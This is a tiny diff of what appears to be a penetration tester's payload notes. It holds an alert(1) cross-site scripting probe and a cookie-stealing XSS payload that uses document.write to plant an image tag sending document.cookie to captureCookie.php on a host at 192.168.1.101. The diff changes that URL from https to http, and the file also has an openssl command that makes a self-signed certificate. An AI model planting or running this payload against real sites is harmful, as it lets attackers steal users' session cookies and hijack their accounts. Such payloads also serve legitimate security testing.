@@ -1,5 +1,5 @@
 <script>alert(1)</script>
-<script>document.write("<img src='https://192.168.1.101/captureCookie.php?cookie=" + escape(document.cookie) + "'/>");</script>
+<script>document.write("<img src='http://192.168.1.101/captureCookie.php?cookie=" + escape(document.cookie) + "'/>");</script>
 
 openssl req -new -newkey rsa:3072 -days 365 -nodes -x509 -keyout server.key -out server.crt
 
